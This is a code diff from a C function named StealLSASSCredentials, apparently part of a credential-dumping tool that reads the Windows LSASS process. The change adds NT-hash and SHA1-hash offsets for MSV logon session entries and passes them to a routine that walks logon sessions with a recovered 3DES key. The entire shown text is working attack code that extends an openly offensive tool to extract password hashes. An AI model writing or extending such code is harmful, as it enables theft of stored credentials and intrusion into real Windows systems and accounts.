@@ -245,6 +245,8 @@ BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Cr
         int MSV_UserNameOffset   = 0x90;
         int MSV_DomainOffset     = 0xA0;
         int MSV_CredsOffset      = 0x108;
+        int MSV_NtHashOffset     = 74;
+        int MSV_Sha1HashOffset   = 106;
         int lslArraySize = sizeof(LsassLogonSessionListArray) / sizeof(LsassLogonSessionListArray[0]);
         for (int li = lslArraySize - 1; li >= 0; li--)
         {
@@ -253,6 +255,8 @@ BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Cr
                 MSV_UserNameOffset = LsassLogonSessionListArray[li].UserNameOffset;
                 MSV_DomainOffset   = LsassLogonSessionListArray[li].DomainOffset;
                 MSV_CredsOffset    = LsassLogonSessionListArray[li].CredentialsOffset;
+                MSV_NtHashOffset   = LsassLogonSessionListArray[li].NtHashOffset;
+                MSV_Sha1HashOffset = LsassLogonSessionListArray[li].Sha1HashOffset;
                 break;
             }
         }
@@ -265,7 +269,7 @@ BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Cr
         for (int li = 0; li < 32; li++)
         {
             DWORD64 SubListHead = LogonSessionListHead + (DWORD64)li * 0x10;
-            DisplayLogonSessionListInformation(hFile, SubListHead, lower32bits, LsassPID, Real3DesKey, i3DesKeyLength, InitializationVector, MSV_UserNameOffset, MSV_DomainOffset, MSV_CredsOffset);
+            DisplayLogonSessionListInformation(hFile, SubListHead, lower32bits, LsassPID, Real3DesKey, i3DesKeyLength, InitializationVector, MSV_UserNameOffset, MSV_DomainOffset, MSV_CredsOffset, MSV_NtHashOffset, MSV_Sha1HashOffset);
         }
         FreeLibrary(hModule);
     }
